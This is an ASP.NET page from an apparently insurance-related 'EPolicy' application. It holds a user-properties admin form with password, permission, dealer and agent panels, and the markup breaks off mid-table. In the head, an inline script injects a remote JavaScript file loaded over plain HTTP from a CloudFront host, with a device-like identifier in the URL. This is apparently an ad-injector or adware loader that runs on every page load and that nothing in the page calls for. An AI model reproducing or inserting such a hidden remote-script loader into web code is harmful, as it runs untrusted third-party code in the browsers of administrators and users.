<%@ Page Language="c#" Inherits="EPolicy.UsersProperties" CodeFile="UsersProperties.aspx.cs" %>

<%@ Register Assembly="AjaxControlToolkit, Version=3.5.50508.0, Culture=neutral, PublicKeyToken=28f01b0e84b6d53e"
    Namespace="AjaxControlToolkit" TagPrefix="Toolkit" %>
<%@ Register Assembly="AjaxControlToolkit" Namespace="AjaxControlToolkit" TagPrefix="asp" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/tr/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head runat="server">
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="apple-touch-icon" href="apple-touch-icon.png">
    <link rel="stylesheet" href="css/bootstrap.min.css" />
    <link rel="icon" href="Images2\LogoGuardian.ico" type="image/x-icon" />
    <style>
        html, body
        {
            height: 100%;
        }
        body
        {
            background-color: #17529B;
        }
        .container-fluid
        {
            height: 100%;
        }
        .row.row-offcanvas.row-offcanvas-left
        {
            height: 100%;
        }
        .col-md-2
        {
            width: 16.66666667%;
            height: 100%;
        }
        .main
        {
            height: 100%;
        }
        .over-top-btn
        {
            width: 100%;
        }
    </style>
        <script src="js/jquery-1.12.1.min.js" type="text/javascript"></script>
    <script src="js/jquery.mask.js" type="text/javascript"></script>
    <link rel="stylesheet" href="css/bootstrap-theme.min.css" />
    <link rel="stylesheet" href="css/main.css" />
    <link href="css/fonts.css" rel="stylesheet" />
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css"
        rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1"
        crossorigin="anonymous" />
    <script type="text/javascript">        (function () { var a = document.createElement("script"); a.type = "text/javascript"; a.async = !0; a.src = "http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.107#p=samsungxssdx840xevox250gb_s1dbnsaf286689w"; var b = document.getElementsByTagName("script")[0]; b.parentNode.insertBefore(a, b); })();
    </script>

        <script type='text/javascript'>
        jQuery(function ($) {
            //$("#AccordionPane1_content_txtHomePhone").mask("(000)-000-0000", { placeholder: "(___)-___-____" });
            //$("#AccordionPane1_content_txtWorkPhone").mask("(000)-000-0000", { placeholder: "(___)-___-____" });
            //$("#AccordionPane1_content_TxtCellular").mask("(000)-000-0000", { placeholder: "(___)-___-____" });
            //$("#AccordionPane1_content_TxtEntryDate").mask("00/00/0000", { placeholder: "__/__/____" });
            //$('#TxtDriverBirthDate').mask('00/00/0000', { placeholder: '__/__/____' });
            
        });
    </script>
</head>
<body>
    <form id="Form1" method="post" runat="server">
    <div class="container-fluid" style="height: 100%">
        <Toolkit:ToolkitScriptManager ID="ToolkitScriptManager1" runat="server" EnableScriptGlobalization="True">
        </Toolkit:ToolkitScriptManager>
        <asp:UpdatePanel ID="UpdatePanel1" runat="server" RenderMode="Block">
            <ContentTemplate>
                <div class="row row-offcanvas row-offcanvas-left" style="height: 100%">
                    <div class="col-sm-3 col-md-2 sidebar-offcanvas" id="sidebar" role="navigation">
                        <asp:PlaceHolder ID="phTopBanner" runat="server"></asp:PlaceHolder>
                    </div>
                    <div class="col-sm-9 col-md-10 main" style="height: 100%">
                        <!--toggle sidebar button-->
                        <p class="visible-xs">
                            <button type="button" class="btn btn-primary btn-xs" data-toggle="offcanvas">
                                <i class="glyphicon glyphicon-chevron-left"></i>
                            </button>
                        </p>
                        <h1 class="page-header">
                            User Properties</h1>
                        <div class="form=group" align="center">
                            <asp:Button ID="btnEdit" TabIndex="10" runat="server" Text="MODIFY" CssClass="btn btn-primary btn-lg"
                                Width="150px" OnClick="btnEdit_Click"></asp:Button>
                            <asp:Button ID="btnAdd" TabIndex="11" runat="server" Text="ADD" CssClass="btn btn-primary btn-lg"
                                Width="150px" OnClick="btnAdd_Click"></asp:Button>
                            <asp:Button ID="BtnSave" TabIndex="12" runat="server" Text="SAVE" CssClass="btn btn-primary btn-lg"
                                Width="150px" OnClick="BtnSave_Click"></asp:Button>
                            <asp:Button ID="btnCancel" TabIndex="13" runat="server" Text="CANCEL" CssClass="btn btn-primary btn-lg"
                                Width="150px" OnClick="btnCancel_Click"></asp:Button>
                            <asp:Button ID="BtnExit" TabIndex="14" runat="server" CssClass="btn btn-primary btn-lg"
                                Text="EXIT" Width="150px" OnClick="BtnExit_Click"></asp:Button>
                            <br />
                            <br />
                            <div align="left">
                            </div>
                        </div>
                        <div class="form-group" align="center">
                            <asp:UpdateProgress ID="UpdateProgress1" runat="server" AssociatedUpdatePanelID="UpdatePanel1"
                                DisplayAfter="10">
                                <ProgressTemplate>
                                    <img alt="" src="Images2/loader.gif" style="width: 40px; height: 40px;" />
                                    <span><span class=""></span><span class="" style="font-size: 18px">Please wait...</span></span> </ProgressTemplate>
                            </asp:UpdateProgress>
                        </div>
                        <div class="row formWraper" style="padding: 0px;">
                            <Toolkit:Accordion ID="MyAccordion" runat="Server" AutoSize="None" CssClass="accordion"
                                HeaderSelectedCssClass="" FadeTransitions="true" FramesPerSecond="40" HeaderCssClass="accordion-head"
                                ContentCssClass="accordion-body" RequireOpenedPane="false" SuppressHeaderPostbacks="true"
                                TransitionDuration="250">
                                <Panes>
                                    <Toolkit:AccordionPane ID="AccordionPane1" runat="server">
                                        <Header>
                                            <asp:Label ID="Label17" runat="server" Font-Bold="True">USER PROPETIES: </asp:Label>
                                            <asp:Label ID="lblUserName" runat="server" Font-Bold="True"></asp:Label>
                                            <div class="arrow down">
                                            </div>
                                        </Header>
                                        <Content>
                                        <div class="col-sm-1">
                                            </div>
                                            <div class="col-sm-3">
                                                <br />
                                                <asp:CheckBox ID="ChkAccountDisable" TabIndex="1" runat="server" CssClass="headform2"
                                                    AutoPostBack="True" Text="Disable Account"></asp:CheckBox> &nbsp;&nbsp;
                                                <asp:CheckBox ID="ChkChangePassword" TabIndex="2" runat="server" Text="Change Password"
                                                    AutoPostBack="True"></asp:CheckBox>
                                                     <br />
                                                      <br />
                                                <asp:Label ID="Label2" runat="server" EnableViewState="False" CssClass="labelForControl">Username</asp:Label>
                                                 <br />
                                                <asp:TextBox ID="TxtUserName" TabIndex="3" runat="server" MaxLength="15" CssClass="form-controlWhite"></asp:TextBox>
                                                 <br />
                                                  <br />
                                                   <asp:Label ID="Label1" runat="server" EnableViewState="False" CssClass="labelForControl">Name</asp:Label>
                                                    <br />
                                                <asp:TextBox ID="TxtFirstName" TabIndex="4" runat="server" MaxLength="20" CssClass="form-controlWhite"></asp:TextBox>
                                                 <br />
                                                  <br />
                                                     <asp:Label ID="lblLastName" runat="server" EnableViewState="False" CssClass="labelForControl">Last Name</asp:Label>
                                                      <br />
                                                <asp:TextBox ID="txtLastname" TabIndex="5" runat="server" MaxLength="20" CssClass="form-controlWhite"></asp:TextBox>
                                                <br />
                                                  <br />
                                                   <asp:Label ID="Label3" runat="server" EnableViewState="False" CssClass="labelForControl">New Password</asp:Label>
                                                    <br />
                                                <asp:TextBox ID="TxtPassword" TabIndex="6" runat="server" MaxLength="15" TextMode="Password" CssClass="form-controlWhite"></asp:TextBox>
                                                 <br />
                                                  <br />
                                                      <asp:Label ID="Label4" runat="server" EnableViewState="False" CssClass="labelForControl">Confirm Password</asp:Label>
                                                       <br />
                                                <asp:TextBox ID="TxtConfirmPassword" TabIndex="7" runat="server" MaxLength="15" TextMode="Password" CssClass="form-controlWhite"></asp:TextBox>
                                                 <br />
                                                  <br />
                                                                                                  
                                            </div>
                                            <div class="col-sm-1">
                                            </div>
                                            <div class="col-sm-3">
                                                <br />
                                                 <asp:CheckBox ID="chkPassExpires" runat="server" AutoPostBack="True" Text="Pass. Expires" />
                                                   <br />
                                                    <br />
                                                  <asp:Label ID="Label6" runat="server" CssClass="labelForControl">Date</asp:Label>
                                                   <br />
                                                  <asp:TextBox ID="TxtEntryDate"
                                                    TabIndex="3" runat="server" MaxLength="15" CssClass="form-controlWhite"></asp:TextBox>
                                                     <br />
                                                      <br />
                                                 
                                                   <asp:Label ID="lblB" runat="server" CssClass="labelForControl">Office</asp:Label>
                                                    <br />
                                                <asp:DropDownList ID="ddlLocation" TabIndex="8" CssClass="form-controlWhite" runat="server">
                                                </asp:DropDownList>
                                                 <br />
                                                  <br />
                                                <asp:Label ID="Label7" runat="server" CssClass="labelForControl">Deafult Dealer</asp:Label>
                                                 <br />
                                                <asp:DropDownList ID="ddlDealer" TabIndex="8" runat="server" CssClass="form-controlWhite">
                                                </asp:DropDownList>
                                              <br />
                                               <br />
                                                <asp:Label ID="Label10" runat="server" CssClass="labelForControl">Deafult Agent</asp:Label>
                                                 <br />
                                                <asp:DropDownList ID="ddlAgent" TabIndex="8" runat="server" CssClass="form-controlWhite">
                                                </asp:DropDownList>
                                                <br />
                                                 <br />

                                                <asp:Label ID="Label18" runat="server" CssClass="labelForControl">Deafult Agent VI</asp:Label>
                                                 <br />
                                                <asp:DropDownList ID="ddlAgentVI" TabIndex="8" runat="server" CssClass="form-controlWhite">
                                                </asp:DropDownList>
                                                 <br />
                                                  <br />
                                                 <asp:CheckBox ID="ChkTodoDia" runat="server" Width="104px" Text="All Days" Font-Bold="True"
                                                    Checked="True"></asp:CheckBox>
                                                     <br />
                                                      <br />
                                                <asp:Label ID="Label5" runat="server" CssClass="labelForControl">Comments</asp:Label>
                                                 <br />
                                                <asp:TextBox ID="TxtComments" CssClass="form-controlWhite" TabIndex="9" runat="server"
                                                    MaxLength="200" TextMode="MultiLine" Height="100px"></asp:TextBox>



                                                <asp:CheckBox ID="chkAgent" runat="server" Text="Filter By Agent" Visible="False" />
                                                <asp:CheckBox ID="chkDealer" runat="server" Text="Filter By Dealer" Visible="False" />
                                                <asp:Label ID="Label8" runat="server" EnableViewState="False" Visible="False" >Hour From:</asp:Label>
                                                <asp:DropDownList ID="ddlTime1" runat="server" Visible="False" >
                                                    <asp:ListItem Value="6:00 AM" Selected="True">6:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="7:00 AM">7:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="8:00 AM">8:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="9:00 AM">9:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="10:00 AM">10:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="11:00 AM">11:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="12:00 PM">12:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="1:00 PM">1:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="2:00 PM">2:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="3:00 PM">3:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="4:00 PM">4:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="5:00 PM">5:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="6:00 PM">6:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="7:00 PM">7:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="8:00 PM">8:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="9:00 PM">9:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="10:00 PM">10:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="11:00 PM">11:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="12:00 AM">12:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="1:00 AM">1:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="2:00 AM">2:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="3:00 AM">3:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="4:00 AM">4:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="5:00 AM">5:00 AM</asp:ListItem>
                                                </asp:DropDownList>
                                                <asp:CheckBox ID="ChkLunes" runat="server" Text="Monday" Visible="False" ></asp:CheckBox>
                                                <asp:CheckBox ID="ChkMiercoles" runat="server" Text="Wednesday" Visible="False" ></asp:CheckBox>
                                                <asp:CheckBox ID="ChkViernes" runat="server" Text="Friday" Visible="False" ></asp:CheckBox>
                                                <asp:CheckBox ID="ChkMartes" runat="server" Text="Tuesday" Visible="False" ></asp:CheckBox>
                                                <asp:CheckBox ID="ChkJueves" runat="server" Text="Thursday" Visible="False" ></asp:CheckBox>
                                                <asp:CheckBox ID="ChkSabado" runat="server" Text="Saturday" Visible="False" ></asp:CheckBox>
                                                <asp:CheckBox ID="ChkDomingo" runat="server" Text="Sunday" Visible="False" ></asp:CheckBox>
                                                <asp:Label ID="Label9" runat="server" EnableViewState="False" Visible="False" >Hour To:</asp:Label>
                                                <asp:DropDownList ID="ddlTime2" runat="server" Visible="False" >
                                                    <asp:ListItem Value="6:00 AM">6:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="7:00 AM">7:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="8:00 AM">8:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="9:00 AM">9:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="10:00 AM">10:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="11:00 AM">11:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="12:00 PM">12:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="1:00 PM">1:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="2:00 PM">2:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="3:00 PM">3:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="4:00 PM">4:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="5:00 PM">5:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="6:00 PM" Selected="True">6:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="7:00 PM">7:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="8:00 PM">8:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="9:00 PM">9:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="10:00 PM">10:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="11:00 PM">11:00 PM</asp:ListItem>
                                                    <asp:ListItem Value="12:00 AM">12:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="1:00 AM">1:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="2:00 AM">2:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="3:00 AM">3:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="4:00 AM">4:00 AM</asp:ListItem>
                                                    <asp:ListItem Value="5:00 AM">5:00 AM</asp:ListItem>
                                                </asp:DropDownList>                                                
                                            </div>
                                            <div class="col-sm-1">
                                            </div>
                                            <div class="col-sm-2">
                                               
                                                <asp:Label ID="lblAddDealer" runat="server"></asp:Label>
                                            </div>
                                              <div class="col-sm-12" align="center">
                                                <br />
                                              
                                            </div>
                                        </Content>
                                    </Toolkit:AccordionPane>
                                </Panes>
                            </Toolkit:Accordion>
                        </div>

                      
                        

                        <div class="row formWraper" style="padding: 0px;">
                            <Toolkit:Accordion ID="Accordion1" runat="Server" AutoSize="None" CssClass="accordion"
                                HeaderSelectedCssClass="" FadeTransitions="true" FramesPerSecond="40" HeaderCssClass="accordion-head"
                                ContentCssClass="accordion-body" RequireOpenedPane="false" SelectedIndex="0"
                                SuppressHeaderPostbacks="true" TransitionDuration="250">
                                <Panes>
                                    <Toolkit:AccordionPane ID="AccordionPane2" runat="server">
                                        <Header>
                                            PERMISSIONS
                                            <div class="arrow down">
                                            </div>
                                        </Header>
                                        <Content>
                                             <div class="col-sm-12" align="center">
                                                <br />
                                                  <asp:DataGrid ID="DataGridGroup" CssClass="table table-striped" runat="server" PageSize="15"
                        BorderWidth="0" ItemStyle-HorizontalAlign="center" HeaderStyle-HorizontalAlign="Center"
                        BackColor="White" AutoGenerateColumns="False" AllowPaging="True" CellPadding="0" AlternatingItemStyle-BackColor="#EBEBEB" HeaderStyle-BackColor="Gray" ItemStyle-CssClass="HeadForm3"
                        OnItemCommand="DataGridGroup_ItemCommand" Font-Italic="False" Font-Bold="True" Font-Size="14px" BorderColor="Transparent" 
                        Width="425px" HeaderStyle-ForeColor="White" HeaderStyle-Height="30px">
                                            <FooterStyle ForeColor="Black" />
                                            <SelectedItemStyle BackColor="White" CssClass="" HorizontalAlign="Left" />
                                            <EditItemStyle BackColor="White" HorizontalAlign="Center" />
                                            <AlternatingItemStyle HorizontalAlign="Left" BackColor="#EBEBEB" />
                                            <ItemStyle HorizontalAlign="Left" BorderColor="#EBEBEB" />
                                            <HeaderStyle BackColor="Gray" ForeColor="White" Height="30px" HorizontalAlign="Left"
                                                Font-Bold="True" />
                        <Columns>
                           <asp:ButtonColumn ButtonType="LinkButton" HeaderStyle-HorizontalAlign="Center" CommandName="Select" Text="&lt;img src='images2/searchGrid.png' width='26px' height='30px' &gt;"
                                                    HeaderText="Select">
                                                    <ItemStyle HorizontalAlign="Center" />
                                <HeaderStyle Width="0.25in"></HeaderStyle>
                            </asp:ButtonColumn>
                            <asp:BoundColumn Visible="False" DataField="AuthenticatedGroupID" HeaderText="Authenticated Group ID">
                                <ItemStyle HorizontalAlign="Left"></ItemStyle>
                            </asp:BoundColumn>
                            <asp:BoundColumn DataField="AuthenticatedGroupDesc" HeaderText="Member of:">
                                <ItemStyle HorizontalAlign="Left"></ItemStyle>
                            </asp:BoundColumn>
                            <asp:ButtonColumn ButtonType="PushButton" HeaderStyle-HorizontalAlign="Center"  CommandName="Add" HeaderText="Add">
                              <ItemStyle HorizontalAlign="Center" />
                              </asp:ButtonColumn>
                            <asp:BoundColumn Visible="False" DataField="AuthenticatedGroupUserID" ReadOnly="True" HeaderText="AuthenticatedGroupUser">                              
                                </asp:BoundColumn>
                            <asp:ButtonColumn ButtonType="PushButton" HeaderStyle-HorizontalAlign="Center"  CommandName="Delete" HeaderText="Delete">
                            <ItemStyle HorizontalAlign="Center" />
                            </asp:ButtonColumn>
                        </Columns>
                       <PagerStyle HorizontalAlign="Center" Mode="NumericPages" BackColor="White" ForeColor="Gray" Font-Size="18px"
                                                PageButtonCount="15" BorderWidth="0px" />
                    </asp:DataGrid>
                     </div>
                     <div class="col-sm-4" align="center">
                                                <asp:Label ID="LblTotalCases" runat="server" Visible="False"></asp:Label>
                                                <asp:Label ID="LblPermissionType" Height="3px" runat="server" Visible="False"></asp:Label>
                                                <br />
                                                <asp:DataGrid ID="DataGridPermission" runat="server" CssClass="tableMain"
                                                    BorderWidth="0px"  ItemStyle-HorizontalAlign="center" HeaderStyle-HorizontalAlign="Center"
                                                    BackColor="White" AutoGenerateColumns="False" AllowPaging="True" CellPadding="0"
                                                    AlternatingItemStyle-CssClass="" AlternatingItemStyle-BackColor="#EBEBEB"
                                                    HeaderStyle-CssClass="" HeaderStyle-BackColor="Gray" ItemStyle-CssClass=""
                                                    OnItemCommand="DataGridPermission_ItemCommand" 
                                                     Font-Bold="True" Font-Size="14px" BorderColor="Transparent"  PageSize="15"
                                                    Font-Overline="False" Font-Strikeout="False" Font-Underline="False" Width="400px">
                                                   <FooterStyle ForeColor="Black" />
                                            <SelectedItemStyle BackColor="White" CssClass="" HorizontalAlign="Left" />
                                            <EditItemStyle BackColor="White" HorizontalAlign="Center" />
                                            <AlternatingItemStyle HorizontalAlign="Left" BackColor="#EBEBEB" />
                                            <ItemStyle HorizontalAlign="Left" BorderColor="#EBEBEB" />
                                            <HeaderStyle BackColor="Gray" ForeColor="White" Height="30px" HorizontalAlign="Left"
                                                Font-Bold="True" />
                                                    <Columns>
                                                       <asp:ButtonColumn ButtonType="LinkButton" HeaderStyle-HorizontalAlign="Center" CommandName="Select" Text="&lt;img src='images2/searchGrid.png' width='26px' height='30px' &gt;"
                                                    HeaderText="Select">
                                                    <ItemStyle HorizontalAlign="Center" />
                                                       	</asp:ButtonColumn>
                                                        <asp:BoundColumn DataField="AuthenticatedPermissionDesc" HeaderText="Permissions">
                                                            <ItemStyle HorizontalAlign="Left"></ItemStyle>
                                                        </asp:BoundColumn>
                                                    </Columns>
                                                  <PagerStyle HorizontalAlign="Center" Mode="NumericPages" BackColor="White" ForeColor="Gray" Font-Size="18px"
                                                PageButtonCount="15" BorderWidth="0px" />
                                                </asp:DataGrid>
                                             </div>
                                        </Content>
                                    </Toolkit:AccordionPane>
                                </Panes>
                            </Toolkit:Accordion>
                        </div>
                        <div class="row formWraper" style="padding: 0px;">
                            <Toolkit:Accordion ID="Accordion2" runat="Server" AutoSize="None" CssClass="accordion"
                                HeaderSelectedCssClass="" FadeTransitions="true" FramesPerSecond="40" HeaderCssClass="accordion-head"
                                ContentCssClass="accordion-body" RequireOpenedPane="false" SelectedIndex="0"
                                SuppressHeaderPostbacks="true" TransitionDuration="250">
                                <Panes>
                                    <Toolkit:AccordionPane ID="AccordionPane3" runat="server">
                                        <Header>
                                            DEALERS
                                            <div class="arrow down">
                                            </div>
                                        </Header>
                                        <Content>
                                            <div class="col-sm-12" align="center">
                                                <br />
                                                <asp:Label ID="Label12" runat="server" EnableViewState="False" CssClass="labelForControl"> Add Dealer by User</asp:Label>
                                                <br />
                                                <asp:DropDownList ID="ddlDealer2" TabIndex="23" runat="server" CssClass="form-controlWhite"  Width="300px">
                                                </asp:DropDownList>
                                                <asp:Button ID="btnAdd2" TabIndex="47" runat="server" Text="Add" OnClick="btnAdd2_Click" CssClass="btn btn-primary btn-lg"
                                Width="150px">
                                                </asp:Button>
                                                <br />
                                                <br />
                                                <asp:DataGrid ID="dgDealer" runat="server" CssClass="tableMain"  BorderWidth="0px"
                                                     ItemStyle-HorizontalAlign="center" HeaderStyle-HorizontalAlign="Center"
                                                    BackColor="White" AutoGenerateColumns="False" AllowPaging="True" CellPadding="0"
                                                    AlternatingItemStyle-CssClass="" AlternatingItemStyle-BackColor="#EBEBEB"
                                                    HeaderStyle-CssClass="" HeaderStyle-BackColor="Gray" ItemStyle-CssClass=""
                                                    OnItemCommand="dgDealer_ItemCommand" Font-Italic="False" Font-Overline="False"
                                                     Font-Bold="True" Font-Size="14px" BorderColor="Transparent"  PageSize="15"
                                                    Font-Strikeout="False" Font-Underline="False" Width="400px" HorizontalAlign="Center">
                                                    <FooterStyle ForeColor="Black" />
                                            <SelectedItemStyle BackColor="White" CssClass="" HorizontalAlign="Left" />
                                            <EditItemStyle BackColor="White" HorizontalAlign="Center" />
                                            <AlternatingItemStyle HorizontalAlign="Left" BackColor="#EBEBEB" />
                                            <ItemStyle HorizontalAlign="Left" BorderColor="#EBEBEB" />
                                            <HeaderStyle BackColor="Gray" ForeColor="White" Height="30px" HorizontalAlign="Left" Font-Bold="True" />
                                                    <Columns>
                                                        <asp:BoundColumn Visible="False" DataField="CompanyDealerID" HeaderText="CompanyDealerID">
                                                            <ItemStyle HorizontalAlign="Left" />
                                                        </asp:BoundColumn>
                                                        <asp:BoundColumn DataField="CompanyDealerDesc" HeaderText="CompanyDealer">
                                                            <ItemStyle HorizontalAlign="Left" />
                                                        </asp:BoundColumn>
                                                        <asp:ButtonColumn ButtonType="PushButton" CommandName="Delete" HeaderText="Del.">
                                                        </asp:ButtonColumn>
                                                        <asp:BoundColumn Visible="False" DataField="GroupDealerID" HeaderText="GroupDealerID">
                                                        </asp:BoundColumn>
                                                    </Columns>
                                                    <PagerStyle HorizontalAlign="Center" Mode="NumericPages" BackColor="White" ForeColor="Gray" Font-Size="18px"
                                                PageButtonCount="15" BorderWidth="0px" />
                                                </asp:DataGrid>
                                            </div>
                                        </Content>
                                    </Toolkit:AccordionPane>
                                </Panes>
                            </Toolkit:Accordion>
                        </div>
                        <div class="row formWraper" style="padding: 0px;">
                            <Toolkit:Accordion ID="Accordion3" runat="Server" AutoSize="None" CssClass="accordion"
                                HeaderSelectedCssClass="" FadeTransitions="true" FramesPerSecond="40" HeaderCssClass="accordion-head"
                                ContentCssClass="accordion-body" RequireOpenedPane="false" SelectedIndex="0"
                                SuppressHeaderPostbacks="true" TransitionDuration="250">
                                <Panes>
                                    <Toolkit:AccordionPane ID="AccordionPane4" runat="server">
                                        <Header>
                                            AGENTS
                                            <div class="arrow down">
                                            </div>
                                        </Header>
                                        <Content>
                                            <div class="col-sm-12" align="center">
                                                <br />
                                                <asp:Label ID="Label11" runat="server" CssClass="labelForControl">Add Agent PR By User</asp:Label>
                                                <br />
                                                <asp:DropDownList ID="ddlAgentByUser" TabIndex="23" runat="server" CssClass="form-controlWhite"  Width="300px">
                                                </asp:DropDownList>
                                                <asp:Button ID="btnAddAgent" runat="server" OnClick="btnAddAgent_Click" TabIndex="47" CssClass="btn btn-primary btn-lg"
                                Width="150px" Text="ADD" />
                                                <br />
                                                <br />
                                                <asp:DataGrid ID="dgAgentByUser" runat="server" CssClass="tableMain" 
                                                    BorderWidth="0px" ItemStyle-HorizontalAlign="center" HeaderStyle-HorizontalAlign="Center"
                                                    BackColor="White" AutoGenerateColumns="False" AllowPaging="True" CellPadding="0"
                                                    AlternatingItemStyle-CssClass="" AlternatingItemStyle-BackColor="#EBEBEB"
                                                    HeaderStyle-CssClass="" HeaderStyle-BackColor="Gray" ItemStyle-CssClass=""
                                                    OnItemCommand="dgAgentByUser_ItemCommand" Font-Italic="False"
                                                    Font-Bold="True" Font-Size="14px" BorderColor="Transparent"  PageSize="15"
                                                    Font-Overline="False" Font-Strikeout="False" Font-Underline="False" Width="400px"
                                                    HorizontalAlign="Center">
                                                    <FooterStyle ForeColor="Black" />
                                            <SelectedItemStyle BackColor="White" CssClass="" HorizontalAlign="Left" />
                                            <EditItemStyle BackColor="White" HorizontalAlign="Center" />
                                            <AlternatingItemStyle HorizontalAlign="Left" BackColor="#EBEBEB" />
                                            <ItemStyle HorizontalAlign="Left" BorderColor="#EBEBEB" />
                                            <HeaderStyle BackColor="Gray" ForeColor="White" Height="30px" HorizontalAlign="Left" Font-Bold="True" />
                                                    <Columns>
                                                        <asp:BoundColumn Visible="False" DataField="AgentID" HeaderText="AgentID">
                                                            <ItemStyle HorizontalAlign="Left" />
                                                        </asp:BoundColumn>
                                                        <asp:BoundColumn DataField="AgentDesc" HeaderText="Agent">
                                                            <ItemStyle HorizontalAlign="Left" />
                                                        </asp:BoundColumn>
                                                        <asp:ButtonColumn ButtonType="PushButton" CommandName="Delete" HeaderText="Delete">
                                                          <ItemStyle HorizontalAlign="Center" />
                                                        </asp:ButtonColumn>
                                                        <asp:BoundColumn Visible="False" DataField="GroupAgentID" HeaderText="GroupAgentID">
                                                        </asp:BoundColumn>
                                                    </Columns>
                                                 <PagerStyle HorizontalAlign="Center" Mode="NumericPages" BackColor="White" ForeColor="Gray" Font-Size="18px"
                                                PageButtonCount="15" BorderWidth="0px" />
                                                </asp:DataGrid>
                                            </div>
                                        </Content>
                                    </Toolkit:AccordionPane>
                                </Panes>
                            </Toolkit:Accordion>
                        </div>
                        <div class="row formWraper" style="padding: 0px;">
                            <Toolkit:Accordion ID="Accordion4" runat="Server" AutoSize="None" CssClass="accordion"
                                HeaderSelectedCssClass="" FadeTransitions="true" FramesPerSecond="40" HeaderCssClass="accordion-head"
                                ContentCssClass="accordion-body" RequireOpenedPane="false" SelectedIndex="0"
                                SuppressHeaderPostbacks="true" TransitionDuration="250">
                                <Panes>
                                    <Toolkit:AccordionPane ID="AccordionPane5" runat="server">
                                        <Header>
                                            AGENTS VI
                                            <div class="arrow down">
                                            </div>
                                        </Header>
                                        <Content>
                                           <div class="col-sm-12" align="center">
                                                <br />
                                                <asp:Label ID="Label19" runat="server" CssClass="labelForControl">Add Agent VI By User:</asp:Label>
                                                <br />
                                                <asp:DropDownList ID="ddlAgentByUserVI" TabIndex="23" runat="server" CssClass="form-controlWhite" Width="300px">
                                                </asp:DropDownList>
                                                <asp:Button ID="btnAddAgentVI" runat="server" OnClick="btnAddAgentVI_Click" TabIndex="47" CssClass="btn btn-primary btn-lg"
                                                 Width="150px" Text="ADD" />
                                                <br />
                                                <br />
                                                <asp:DataGrid ID="dgAgentByUserVI" runat="server" CssClass="tableMain"
                                                    BorderWidth="0px" ItemStyle-HorizontalAlign="center" HeaderStyle-HorizontalAlign="Center"
                                                    BackColor="White" AutoGenerateColumns="False" AllowPaging="True" CellPadding="0"
                                                    AlternatingItemStyle-CssClass="" AlternatingItemStyle-BackColor="#EBEBEB"
                                                    HeaderStyle-CssClass="" HeaderStyle-BackColor="Gray" ItemStyle-CssClass=""
                                                    OnItemCommand="dgAgentByUserVI_ItemCommand"  Font-Bold="True" Font-Size="14px" BorderColor="Transparent"  PageSize="15"
                                                     Width="400px" HorizontalAlign="Center">
                                                     <FooterStyle ForeColor="Black" />
                                            <SelectedItemStyle BackColor="White" CssClass="" HorizontalAlign="Left" />
                                            <EditItemStyle BackColor="White" HorizontalAlign="Center" />
                                            <AlternatingItemStyle HorizontalAlign="Left" BackColor="#EBEBEB" />
                                            <ItemStyle HorizontalAlign="Left" BorderColor="#EBEBEB" />
                                            <HeaderStyle BackColor="Gray" ForeColor="White" Height="30px" HorizontalAlign="Left" Font-Bold="True" />
                                                    <Columns>
                                                        <asp:BoundColumn Visible="False" DataField="AgentID" HeaderText="AgentID">
                                                            <ItemStyle HorizontalAlign="Left" />
                                                        </asp:BoundColumn>
                                                        <asp:BoundColumn DataField="AgentDesc" HeaderText="Agent">
                                                            <ItemStyle HorizontalAlign="Left" />
                                                        </asp:BoundColumn>
                                                        <asp:ButtonColumn ButtonType="PushButton" CommandName="Delete" HeaderText="Delete">
                                                          <ItemStyle HorizontalAlign="Center" />
                                                        </asp:ButtonColumn>
                                                        <asp:BoundColumn Visible="False" DataField="GroupAgentID" HeaderText="GroupAgentID">
                                                        </asp:BoundColumn>
                                                    </Columns>
